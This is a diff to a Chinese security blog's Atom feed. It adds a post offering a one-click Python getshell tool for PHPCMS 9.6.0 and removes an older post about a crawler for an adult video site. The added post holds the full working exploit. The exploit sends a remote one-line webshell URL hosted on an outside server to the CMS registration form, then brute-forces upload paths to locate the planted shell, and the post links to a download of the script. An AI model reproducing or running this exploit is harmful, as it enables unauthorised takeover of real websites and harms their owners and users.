@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://akkuman.coding.me/"/>
-  <updated>2017-04-06T03:25:08.672Z</updated>
+  <updated>2017-04-10T11:21:23.657Z</updated>
   <id>http://akkuman.coding.me/</id>
   
   <author>
@@ -14,6 +14,43 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>phpcms9-6-0 一键getshell工具</title>
+    <link href="http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
+    <id>http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html</id>
+    <published>2017-04-10T05:13:29.000Z</published>
+    <updated>2017-04-10T11:21:23.657Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
+<li>一键化<code>python 1.py http://xxx.com</code></li>
+<li>不再是只允许执行一次有回显，加入了爆破，1-3s内即可找到你的webshell，不论是否有回显，只要成功</li>
+</ul>
+<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
+<li>[] 加入对有验证码phpcms网站的支持</li>
+<li>[] 加入批量</li>
+</ul>
+<p>&lt;!-more–&gt;</p>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTime</span><span class="params">()</span>:</span></div><div class="line">    year = str(datetime.now().year)</div><div class="line">    month = <span class="string">"%02d"</span> % datetime.now().month</div><div class="line">    day = <span class="string">"%02d"</span> % datetime.now().day</div><div class="line">    hour = datetime.now().hour</div><div class="line">    hour = hour - <span class="number">12</span> <span class="keyword">if</span> hour &gt; <span class="number">12</span> <span class="keyword">else</span> hour</div><div class="line">    hour = <span class="string">"%02d"</span> % hour</div><div class="line">    minute = <span class="string">"%02d"</span> % datetime.now().minute</div><div class="line">    second = <span class="string">"%02d"</span> % datetime.now().second</div><div class="line">    microsecond = <span class="string">"%06d"</span> % datetime.now().microsecond</div><div class="line">    microsecond = microsecond[:<span class="number">3</span>]</div><div class="line">    nowTime = year + month + day + hour + minute + second + microsecond</div><div class="line">    <span class="keyword">return</span> int(nowTime), year + <span class="string">"/"</span> + month + day + <span class="string">"/"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsafaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsafddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        startTime, _ = getTime()</div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line">        finishTime, dateUrl = getTime()</div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(<span class="string">"[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n"</span>)</div><div class="line">            successUrl = <span class="string">""</span></div><div class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> range(startTime, finishTime):</div><div class="line">                checkUrlHtml = requests.get(</div><div class="line">                    host + <span class="string">"/uploadfile/"</span> + dateUrl + str(t) + <span class="string">".php"</span>)</div><div class="line">                <span class="keyword">if</span> checkUrlHtml.status_code == <span class="number">200</span>:</div><div class="line">                    successUrl = host + <span class="string">"/uploadfile/"</span> + \</div><div class="line">                        dateUrl + str(t) + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                print(</div><div class="line">                    <span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/phpcms9.6.0GetShell_v0.1.py" target="_blank" rel="external">代码下载地址</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;一键化&lt;code&gt;python 1.py http://xxx.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;不再是只允许执行一次有回
+    
+    </summary>
+    
+      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
+    
+    
+      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
+    
+  </entry>
   
   <entry>
     <title>抓取当前登录用户登录密码的工具：mimipenguin</title>
@@ -980,110 +1017,6 @@
     
     
       <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>javbus爬虫-老司机你值得拥有</title>
-    <link href="http://akkuman.coding.me/2016/12/06/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html"/>
-    <id>http://akkuman.coding.me/2016/12/06/javbus爬虫-老司机你值得拥有.html</id>
-    <published>2016-12-06T10:21:53.000Z</published>
-    <updated>2017-03-26T12:44:40.763Z</updated>
-    
-    <content type="html"><![CDATA[<hr>
-<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
-<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="external">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
-<hr>
-<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
-<ul>
-<li>爬虫调度启动程序crawler.py</li>
-<li>页面下载程序downloader.py</li>
-<li>页面解析程序pageparser.py</li>
-<li>数据库入库与去重管理程序controler.py</li>
-</ul>
-<a id="more"></a>
-<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
-<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
-<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
-<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
-<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
-<hr>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
-<p>在写爬虫的过程中遇到了一些问题</p>
-<ol>
-<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
-</li>
-<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
-</li>
-<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
-</li>
-<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
-<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</div></pre></td></tr></table></figure>
-<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
-<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
-<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
-<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
-</li>
-<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="external">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
-</li>
-<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
-<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
-<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
-</li>
-</ol>
-<hr>
-<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
-<ol>
-<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
-</li>
-<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
-</li>
-<li><p>多看别人的博客学习思路</p>
-</li>
-</ol>
-<hr>
-<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
-<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
-<hr>
-<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
-<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
-<hr>
-<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
-<ul>
-<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
-<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="external">javbus_crawler</a></li>
-</ul>
-<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
-<p><strong>转载请注明来源作者</strong></p>
-<ul>
-<li>博客：53xiaoshuo.com | hacktech.cn</li>
-<li>作者：Akkuman</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;hr&gt;
-&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;hr&gt;
-&lt;p&gt;有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的&lt;a href=&quot;https://www.javbus5.com/SRS-055这种链接，&quot;&gt;https://www.javbus5.com/SRS-055这种链接，&lt;/a&gt;&lt;br&gt;我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&quot;构思&quot;&gt;&lt;a href=&quot;#构思&quot; class=&quot;headerlink&quot; title=&quot;构思&quot;&gt;&lt;/a&gt;构思&lt;/h1&gt;&lt;hr&gt;
-&lt;ul&gt;
-&lt;li&gt;爬虫调度启动程序crawler.py&lt;/li&gt;
-&lt;li&gt;页面下载程序downloader.py&lt;/li&gt;
-&lt;li&gt;页面解析程序pageparser.py&lt;/li&gt;
-&lt;li&gt;数据库入库与去重管理程序controler.py&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
-    
-    
-      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
-    
-      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
     
   </entry>
   
